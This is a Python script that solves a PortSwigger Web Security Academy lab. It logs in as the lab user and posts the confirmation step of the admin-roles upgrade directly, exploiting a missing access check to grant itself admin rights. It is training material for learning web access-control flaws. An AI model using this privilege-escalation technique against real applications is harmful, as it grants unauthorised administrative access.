# Lab: Multi-step process with no access control on one step
# https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step

import requests

session = requests.Session()
base_url = "https://ID.web-security-academy.net"

# Login with wiener:peter
login_data = {"username": "wiener", "password": "peter"}
response = session.post(f"{base_url}/login", data=login_data)

# Visiting /admin-roles first step and try upgrading wiener
admin1_url = f"{base_url}/admin-roles"
data1 = {"username": "wiener", "action": "upgrade"}
response = session.post(admin1_url, data=data1)
if response.status_code == 401:
    print(f"Access Control is properly applied: {response.status_code}")

# Visiting /admin-roles second step and try upgrading wiener
admin2_url = f"{base_url}/admin-roles"
data2 = {"action": "upgrade", "confirmed": "true", "username": "wiener"}
response = session.post(admin2_url, data2)
if "Congratulations" in response.text:
    print("Lab solved")
else:
    print("Exploit did not work")


